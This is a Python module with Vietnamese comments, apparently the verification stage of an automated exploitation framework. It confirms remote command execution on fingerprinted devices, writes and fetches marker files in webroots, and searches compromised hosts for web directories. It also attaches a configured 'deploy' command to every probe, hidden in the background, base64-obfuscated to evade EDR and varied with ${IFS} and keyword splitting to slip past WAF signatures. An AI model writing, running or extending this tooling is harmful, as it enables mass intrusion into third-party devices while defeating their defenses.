# -*- coding: utf-8 -*-
"""
Giai đoạn 3: Verifier — xác nhận RCE sau khi exploit module bắn thành công.

Cơ chế:
  * Non-blind module : gửi lệnh probe `id; echo MARKER_<tag>`, phân tích response:
      - tag  xuất hiện          → RCE_CONFIRMED (output lệnh hồi về đủ)
      - chỉ thấy "uid="         → RCE_PROBABLE  (lệnh chạy, output bị cắt)
      - HTTP 200 nhưng không có → VULN_NO_EXEC  (module bắn, chưa chứng minh exec)
      - exploit trả None        → NO_RESPONSE   (mất kết nối / không khai thác được)
  * Blind module        : không đọc được output → ghi marker ra webroot rồi
    GET lại qua HTTP (check_blind). Nếu tìm thấy marker → RCE_CONFIRMED.

Nâng cấp chống bỏ sót / WAF / EDR / webroot:
  * Multi-attempt: thử lần lượt nhiều biến thể payload (gốc → ${IFS}/keyword-split
    → base64-wrap) khi kết quả NO_RESPONSE/VULN_NO_EXEC — né WAF signature.
  * WAF detect qua evasion.waf_detect — ghi chú waf vào finding thay vì
    kết luận nhầm "hết lỗ hổng".
  * EDR_OBFUSCATE: chuỗi deploy được bọc base64 (evasion.edr_wrap).
  * Tìm webroot động:
      - HTTP-derived: Location header, src=/href=/action= trong body.
      - RCE-derived : lệnh `find` chạy qua RCE (module non-blind) → danh sách
        thư mục chứa index.html/index.htm thật trên thiết bị.
      - Device-aware: DEVICE_WEBROOTS theo loại thiết bị fingerprint.
"""

import logging
import re
import time
from urllib.parse import quote

from config import (
    DEVICE_WEBROOTS,
    EDR_OBFUSCATE,
    EVASION_MODE,
    MAX_HTTP_PARSE,
    TIMEOUT,
    VERIFIER_DEPLOY,
    WEBROOT_CANDIDATES,
)
import evasion
from exploits.common import rand_tag
from scanner import http_get

log = logging.getLogger("sofia.verifier")

# Các trạng thái kết luận
RCE_CONFIRMED = "RCE_CONFIRMED"
RCE_PROBABLE = "RCE_PROBABLE"
VULN_NO_EXEC = "VULN_NO_EXEC"   # module bắn được nhưng chưa chứng minh được exec
NO_RESPONSE = "NO_RESPONSE"
FINGERPRINT_ONLY = "FINGERPRINT_ONLY"  # không có PoC an toàn — chỉ ghi nhận fingerprint

# Regex lấy đường dẫn từ body (src/href/action) để suy webroot
_PATH_RE = re.compile(r'(?:src|href|action)\s*=\s*["\']?/([^"\'/ >?#]+)')


def _clean(text, limit=400):
    """Rút gọn văn bản dùng làm evidence, thay dòng mới để ghi 1 dòng JSON."""
    if text is None:
        return ""
    text = " ".join(text.split())
    return text[:limit]


def build_probe(device=""):
    """
    Lệnh probe: `id; echo MARKER_<rand>` + chuỗi deploy (ẩn/nền).
    Khi EDR_OBFUSCATE=True → deploy được bọc base64 (né EDR/proc-scan).
    Khi EVASION_MODE=True → chọn ngẫu nhiên biến thể (gốc / ${IFS}+split /
    base64) để né WAF signature theo chuỗi keyword.
    Trả về (cmd, tag, deploy_used).
    """
    rand = rand_tag()
    tag = "MARKER_" + rand
    variants = evasion.deploy_variants(VERIFIER_DEPLOY, edr=EDR_OBFUSCATE)
    deploy = variants[0]
    if EVASION_MODE and len(variants) > 1:
        deploy = __import__("random").choice(variants)
    cmd = "id; echo %s; %s" % (tag, deploy)
    return cmd, tag, deploy


# ── Tìm webroot động ────────────────────────────────────────────────────
def discover_webroots_http(status, headers, body):
    """
    Suy webroot từ response HTTP (không cần thêm request):
      - Location header (redirect) → thư mục gốc.
      - src=/href=/action= path trong body → thư mục chứa tài nguyên.
    Trả về list đường dẫn (đã dedupe, có trailing slash).
    """
    roots = []
    seen = set()
    loc = (headers or {}).get("location", "")
    if loc.startswith("/") and not loc.startswith("//"):
        seg = loc.split("/")[1]
        if seg and not seg.endswith("."):
            roots.append("/" + seg + "/")
            seen.add("/" + seg + "/")
    body_s = (body or "")[:MAX_HTTP_PARSE]
    for m in _PATH_RE.findall(body_s):
        path = "/" + m + "/"
        if path not in seen:
            roots.append(path)
            seen.add(path)
        if len(roots) >= 12:            # giới hạn, tránh nhiễu
            break
    return roots


def discover_webroots_rce(func, host, port, timeout):
    r"""
    Tìm webroot qua RCE (module non-blind — output lệnh hồi về):
    `find / -maxdepth 6 \( -name index.html -o -name index.htm \) 2>/dev/null`
    → suy thư mục gốc thật trên thiết bị. Trả về list đường dẫn.
    """
    find_cmd = ("find / -maxdepth 6 \\( -name index.html -o -name index.htm \\) "
                "2>/dev/null | head -20")
    try:
        res = func(host, port, timeout, find_cmd)
    except Exception:
        return []
    if not res:
        return []
    roots, seen = [], set()
    for line in (res or "").splitlines():
        line = line.strip()
        if not line.startswith("/"):
            continue
        seg = line.split("/")[1]
        path = "/" + seg + "/"
        if path not in seen:
            roots.append(path)
            seen.add(path)
        if len(roots) >= 8:
            break
    if roots:
        log.debug("RCE-find webroot %s:%d → %s", host, port, roots)
    return roots


def build_webroot_list(device="", http_hints=None, rce_hints=None):
    """
    Hợp nhất webroot: static (WEBROOT_CANDIDATES) + theo thiết bị
    (DEVICE_WEBROOTS) + động (HTTP-derived, RCE-derived). Dedupe, giữ thứ tự.
    """
    merged = []
    seen = set()
    for group in (WEBROOT_CANDIDATES,
                  DEVICE_WEBROOTS.get("unknown", []),
                  DEVICE_WEBROOTS.get(device, []) if device else [],
                  http_hints or [],
                  rce_hints or []):
        for root in group:
            if not root:
                continue
            root = root if root.endswith("/") else root + "/"
            if root not in seen:
                merged.append(root)
                seen.add(root)
    return merged


def _send_probe(func, host, port, cmd, timeout):
    """Gọi exploit module. Trả về (body_text|None). Không raise."""
    try:
        return func(host, port, timeout, cmd)
    except Exception as exc:          # module lỗi → coi như không phản hồi
        log.debug("Exploit %s:%d raise %r", host, port, exc)
        return None


def _http_get_text(host, port, path, timeout):
    """GET http và trả body text; None nếu lỗi."""
    status, _hdrs, body = http_get(host, port, path, timeout)
    return body if status else None


def check_blind(func, host, port, tag, timeout, webroots):
    """
    Xác nhận RCE cho module blind: ghi marker vào từng webroot (static +
    device + phát hiện động) rồi GET lại đường dẫn tương ứng.
    Trả về (status, evidence_path, out_cmd).
    """
    fname = tag.lower() + ".txt"
    for root in webroots:
        path = root.rstrip("/") + "/" + fname
        write_cmd = "echo %s > %s" % (tag, path)
        res = _send_probe(func, host, port, write_cmd, timeout)
        if res is None:
            continue                       # lần ghi này lỗi transport → thử webroot khác
        # Thử GET file qua 2 dạng path: có webroot và bỏ webroot
        url_root = quote(path.lstrip("/"))
        fetched = _http_get_text(host, port, "/" + url_root, timeout)
        if fetched and tag in fetched:
            # Dọn dấu vết (blind — không quan trọng lắm nếu rm không chạy)
            _send_probe(func, host, port, "rm -f %s" % path, timeout)
            return RCE_CONFIRMED, path, write_cmd
    return VULN_NO_EXEC, "", ""


def verify(host, port, cve_id, info, timeout=TIMEOUT):
    """
    Xác nhận RCE cho 1 cặp (host, cve). `info` là metadata registry của CVE:
        {"func": callable, "blind": bool, "fingerprint_only": bool, ...}

    Multi-attempt: nếu lần đầu NO_RESPONSE/VULN_NO_EXEC và EVASION_MODE bật,
    thử lại với biến thể payload khác (tối đa RETRY_ATTEMPTS lần).
    Trả về dict kết quả (luôn JSON-serializable).
    """
    from config import RETRY_ATTEMPTS
    start = time.time()
    func = info["func"]
    blind = bool(info.get("blind", False))
    device = str(info.get("device", "")).lower()

    result = {
        "cve": cve_id, "host": host, "port": port,
        "status": VULN_NO_EXEC, "evidence": "",
        "tag": "", "elapsed": round(time.time() - start, 2),
        "attempts": 0, "waf": "",
    }

    if info.get("fingerprint_only"):
        return {
            "cve": cve_id, "host": host, "port": port,
            "status": FINGERPRINT_ONLY, "evidence": "Module fingerprint_only — chưa có "
            "payload PoC an toàn, không gọi verifier.",
            "elapsed": round(time.time() - start, 2),
        }

    # Chuẩn bị biến thể probe (gốc + né WAF/EDR)
    attempts = []
    for _ in range(max(1, RETRY_ATTEMPTS)):
        cmd, tag, _deploy = build_probe(device)
        attempts.append((cmd, tag))

    last_res = None
    last_waf = ""
    confirmed_tag = ""
    for idx, (cmd, tag) in enumerate(attempts):
        res = _send_probe(func, host, port, cmd, timeout)
        result["attempts"] = idx + 1
        confirmed_tag = tag

        if blind:
            if res is None:
                result["status"] = NO_RESPONSE
                # Nghi WAF chặn kết nối? thử biến thể khác
                continue
            http_hints = discover_webroots_http(*_probe_response_meta(res))
            webroots = build_webroot_list(device, http_hints=http_hints)
            status, path, write_cmd = check_blind(func, host, port, tag, timeout, webroots)
            result["status"] = status
            result["evidence"] = ("Blind-check: ghi marker %s → %s (webroots: %s)"
                                  % (tag, path, ", ".join(webroots[:5]))
                                  if status == RCE_CONFIRMED else
                                  "Module blind bắn OK (HTTP) nhưng không tìm thấy "
                                  "marker trong %d webroot thử." % len(webroots))
            result["tag"] = tag
            return result

        # Non-blind: phân tích output trả về
        if res is None:
            result["status"] = NO_RESPONSE
            continue                        # thử biến thể khác
        last_res = res
        waf_name = _waf_from_response(res)
        if waf_name:
            last_waf = waf_name
        if tag in res:
            result["status"] = RCE_CONFIRMED
            result["evidence"] = "Output lệnh hồi về: " + _clean(res)
            result["tag"] = tag
            result["waf"] = last_waf
            return result
        if "uid=" in res:
            result["status"] = RCE_PROBABLE
            result["evidence"] = "Có 'uid=' trong response (lệnh chạy, output bị cắt): " + _clean(res)
            result["tag"] = tag
            result["waf"] = last_waf
            return result
        # VULN_NO_EXEC — thử biến thể khác nếu còn lượt

    # Hết lượt: kết luận theo dữ liệu cuối cùng
    result["tag"] = confirmed_tag
    result["waf"] = last_waf
    if last_res is None:
        result["status"] = NO_RESPONSE
        result["evidence"] = ("Không phản hồi sau %d lần thử (có thể WAF chặn/"
                              "thiết bị mất kết nối)." % result["attempts"])
    elif result["status"] == VULN_NO_EXEC and last_waf:
        result["evidence"] = ("HTTP phản hồi nhưng không thấy marker/'uid=' sau %d lần "
                              "thử — nghi WAF chặn payload (%s): %s"
                              % (result["attempts"], last_waf, _clean(last_res)))
    elif result["status"] == VULN_NO_EXEC:
        result["evidence"] = ("HTTP phản hồi nhưng không thấy marker/'uid=' sau %d lần "
                              "thử (đã thử biến thể payload khác nhau): %s"
                              % (result["attempts"], _clean(last_res)))
    return result


def _probe_response_meta(res):
    """
    Blind module trả về text body — không có status/headers. Dùng để tìm
    webroot qua body. Trả về (status, headers, body) giả lập.
    """
    return None, {}, (res or "")


def _waf_from_response(res):
    """Nếu response là dict-like (status/headers) thì detect WAF; else rỗng."""
    if isinstance(res, dict):
        return evasion.waf_detect(res.get("status"), res.get("headers", {}),
                                  res.get("body", ""))[1]
    return ""


__all__ = [
    "RCE_CONFIRMED", "RCE_PROBABLE", "VULN_NO_EXEC", "NO_RESPONSE",
    "FINGERPRINT_ONLY", "build_probe", "check_blind", "verify",
    "discover_webroots_http", "discover_webroots_rce", "build_webroot_list",
]


